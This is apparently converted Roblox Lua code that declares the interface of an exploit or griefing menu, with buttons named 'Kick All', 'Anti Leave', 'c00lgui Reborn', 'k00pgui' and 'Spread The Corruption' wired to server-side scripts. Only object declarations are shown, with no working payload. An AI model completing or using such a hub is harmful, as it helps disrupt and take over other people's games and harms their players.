--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER FROM MorrisBr
]=]


-- Instances: 415 | Scripts: ?? | Modules: ??

local G2L = {}

-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end


--[[
    Instances:
--]]

--verified
G2L["0"] = Instance.new("ScreenGui")

--verified.Frame
G2L["1"] = Instance.new("Frame")

--verified.Frame.ImageLabel
G2L["2"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.Dragify
G2L["3"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.Tween
G2L["4"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit
G2L["5"] = Instance.new("ScrollingFrame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton
G2L["6"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.UICorner
G2L["7"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.Script
G2L["8"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.TextButton_Roundify_12px
G2L["9"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder
G2L["10"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.umbraShadow
G2L["11"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.penumbraShadow
G2L["12"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.ambientShadow
G2L["13"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode
G2L["14"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.TextButton_Roundify_12px
G2L["15"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.RippleClick
G2L["16"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.RippleClick.Circle
G2L["17"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.UICorner
G2L["18"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.ServerEventHandler
G2L["19"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder
G2L["20"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder.umbraShadow
G2L["21"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder.penumbraShadow
G2L["22"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder.ambientShadow
G2L["23"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x
G2L["24"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.TextButton_Roundify_12px
G2L["25"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.RippleClick
G2L["26"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.RippleClick.Circle
G2L["27"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.UICorner
G2L["28"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.ServerEventHandler
G2L["29"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder
G2L["30"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder.umbraShadow
G2L["31"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder.penumbraShadow
G2L["32"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder.ambientShadow
G2L["33"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3
G2L["34"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.TextButton_Roundify_12px
G2L["35"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.RippleClick
G2L["36"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.RippleClick.Circle
G2L["37"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.UICorner
G2L["38"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.ServerEventHandler
G2L["39"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder
G2L["40"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder.umbraShadow
G2L["41"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder.penumbraShadow
G2L["42"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder.ambientShadow
G2L["43"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons
G2L["44"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.UICorner
G2L["45"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.RippleClick
G2L["46"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.RippleClick.Circle
G2L["47"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder
G2L["48"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder.umbraShadow
G2L["49"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder.penumbraShadow
G2L["50"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder.ambientShadow
G2L["51"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.TextButton_Roundify_12px
G2L["52"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.ServerEventHandler
G2L["53"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui
G2L["54"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.TextButton_Roundify_12px
G2L["55"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.RippleClick
G2L["56"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.RippleClick.Circle
G2L["57"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.UICorner
G2L["58"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.ServerEventHandler
G2L["59"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder
G2L["60"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder.umbraShadow
G2L["61"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder.penumbraShadow
G2L["62"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder.ambientShadow
G2L["63"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition
G2L["64"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.TextButton_Roundify_12px
G2L["65"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RippleClick
G2L["66"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RippleClick.Circle
G2L["67"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.UICorner
G2L["68"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder
G2L["69"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder.umbraShadow
G2L["70"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder.penumbraShadow
G2L["71"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder.ambientShadow
G2L["72"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.LocalScript
G2L["73"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RemoteEvent
G2L["74"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.Script
G2L["75"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd
G2L["76"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.TextButton_Roundify_12px
G2L["77"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.RippleClick
G2L["78"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.RippleClick.Circle
G2L["79"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.UICorner
G2L["80"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.ServerEventHandler
G2L["81"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder
G2L["82"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder.umbraShadow
G2L["83"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder.penumbraShadow
G2L["84"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder.ambientShadow
G2L["85"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed
G2L["86"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.TextButton_Roundify_12px
G2L["87"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.RippleClick
G2L["88"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.RippleClick.Circle
G2L["89"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.UICorner
G2L["90"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.ServerEventHandler
G2L["91"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder
G2L["92"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder.umbraShadow
G2L["93"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder.penumbraShadow
G2L["94"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder.ambientShadow
G2L["95"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot
G2L["96"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.TextButton_Roundify_12px
G2L["97"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.RippleClick
G2L["98"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.RippleClick.Circle
G2L["99"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.UICorner
G2L["100"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.ServerEventHandler
G2L["101"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder
G2L["102"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder.umbraShadow
G2L["103"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder.penumbraShadow
G2L["104"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder.ambientShadow
G2L["105"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11
G2L["106"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.TextButton_Roundify_12px
G2L["107"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.RippleClick
G2L["108"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.RippleClick.Circle
G2L["109"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.UICorner
G2L["110"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.ServerEventHandler
G2L["111"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder
G2L["112"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder.umbraShadow
G2L["113"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder.penumbraShadow
G2L["114"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder.ambientShadow
G2L["115"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol
G2L["116"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.UICorner
G2L["117"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.TextButton_Roundify_12px
G2L["118"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder
G2L["119"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder.umbraShadow
G2L["120"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder.penumbraShadow
G2L["121"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder.ambientShadow
G2L["122"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.Script
G2L["123"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter
G2L["124"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.UICorner
G2L["125"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.RippleClick
G2L["126"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.RippleClick.Circle
G2L["127"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder
G2L["128"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder.umbraShadow
G2L["129"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder.penumbraShadow
G2L["130"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder.ambientShadow
G2L["131"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.TextButton_Roundify_12px
G2L["132"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.ServerEventHandler
G2L["133"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6
G2L["134"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.TextButton_Roundify_12px
G2L["135"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RippleClick
G2L["136"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RippleClick.Circle
G2L["137"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.UICorner
G2L["138"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder
G2L["139"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder.umbraShadow
G2L["140"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder.penumbraShadow
G2L["141"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder.ambientShadow
G2L["142"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RemoteEvent
G2L["143"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.Script
G2L["144"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.LocalScript
G2L["145"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All
G2L["146"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.UICorner
G2L["147"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.RippleClick
G2L["148"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.RippleClick.Circle
G2L["149"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder
G2L["150"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder.umbraShadow
G2L["151"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder.penumbraShadow
G2L["152"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder.ambientShadow
G2L["153"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.TextButton_Roundify_12px
G2L["154"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.ServerEventHandler
G2L["155"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave
G2L["156"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.UICorner
G2L["157"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.RippleClick
G2L["158"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.RippleClick.Circle
G2L["159"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder
G2L["160"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder.umbraShadow
G2L["161"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder.penumbraShadow
G2L["162"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder.ambientShadow
G2L["163"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.TextButton_Roundify_12px
G2L["164"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.ServerEventHandler
G2L["165"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.UIGridLayout
G2L["166"] = Instance.new("UIGridLayout")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky
G2L["167"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.UICorner
G2L["168"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder
G2L["169"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder.umbraShadow
G2L["170"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder.penumbraShadow
G2L["171"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder.ambientShadow
G2L["172"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.TextButton_Roundify_12px
G2L["173"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.ServerEventHandler
G2L["174"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin
G2L["175"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.UICorner
G2L["176"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.RippleClick
G2L["177"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.RippleClick.Circle
G2L["178"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder
G2L["179"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder.umbraShadow
G2L["180"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder.penumbraShadow
G2L["181"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder.ambientShadow
G2L["182"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.TextButton_Roundify_12px
G2L["183"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.ServerEventHandler
G2L["184"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k
G2L["185"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.RippleClick
G2L["186"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.RippleClick.Circle
G2L["187"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder
G2L["188"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder.umbraShadow
G2L["189"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder.penumbraShadow
G2L["190"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder.ambientShadow
G2L["191"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.TextButton_Roundify_12px
G2L["192"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.UICorner
G2L["193"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.ServerEventHandler
G2L["194"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption
G2L["195"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.UICorner
G2L["196"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.RippleClick
G2L["197"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.RippleClick.Circle
G2L["198"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder
G2L["199"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder.umbraShadow
G2L["200"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder.penumbraShadow
G2L["201"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder.ambientShadow
G2L["202"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.TextButton_Roundify_12px
G2L["203"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.ServerEventHandler
G2L["204"] = Instance.new("Script")

